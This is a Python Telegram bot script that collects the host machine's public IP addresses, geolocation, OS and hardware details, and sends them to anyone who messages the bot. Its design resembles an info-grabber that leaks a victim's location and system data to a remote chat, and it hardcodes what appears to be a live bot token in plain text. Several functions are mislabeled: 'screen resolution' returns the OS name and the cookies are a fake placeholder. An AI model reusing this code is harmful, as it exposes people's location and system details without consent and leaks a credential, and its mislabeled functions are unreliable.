import requests
import platform
from datetime import datetime
import pytz
import telepot
from telepot.loop import MessageLoop
from http.cookies import SimpleCookie

TOKEN_HAIBE = '6710607613:AAEsmkIKl0ByuHP54fG1ujxPrsolXm4zeeY'

def send_telegram_message(chat_id, message):
    try:
        bot = telepot.Bot(TOKEN_HAIBE)
        bot.sendMessage(chat_id, message)
    except telepot.exception.TelegramError as e:
        print(f"Failed to send message: {e}")

def get_system_info():
    return {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Architecture": platform.architecture()
    }

def get_geo_info(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def get_ip_info():
    ip_info = {}
    try:
        ip_info['IPv4'] = requests.get('https://api.ipify.org?format=json').json()['ip']
        ip_info['IPv6'] = requests.get('https://api64.ipify.org?format=json').json()['ip']
    except Exception as e:
        ip_info['error'] = str(e)
    return ip_info

def get_user_agent():
    return requests.get('https://httpbin.org/user-agent').json()['user-agent']

def get_screen_info():
    try:
        return {
            "Screen Resolution": f"{platform.uname().system} {platform.uname().release}"
        }
    except Exception as e:
        return {"error": str(e)}

def get_cookies():
    return {
        "cookie_example": "example_cookie_value"
    }

def handle(msg):
    chat_id = msg['chat']['id']
    message = msg['text']
    
    ip_info = get_ip_info()
    system_info = get_system_info()
    user_agent = get_user_agent()
    screen_info = get_screen_info()
    cookies = get_cookies()
    geo_info = get_geo_info(ip_info.get('IPv4', ''))
    
    response_message = f"""
    IP Address: {ip_info.get('IPv4')}
    IPv6 Address: {ip_info.get('IPv6')}
    User Agent: {user_agent}
    System Info: {system_info}
    Screen Info: {screen_info}
    Cookies: {cookies}
    City: {geo_info.get('city', 'N/A')}
    Timezone: {geo_info.get('timezone', 'N/A')}
    Country: {geo_info.get('country', 'N/A')}
    Date & Time: {datetime.now(pytz.timezone(geo_info.get('timezone', 'UTC'))).strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    send_telegram_message(chat_id, response_message)

def main():
    bot = telepot.Bot(TOKEN_HAIBE)
    MessageLoop(bot, handle).run_as_thread()
    print('CRE BY HAIBE')

    import time
    while True:
        time.sleep(10)

if __name__ == '__main__':
    main()
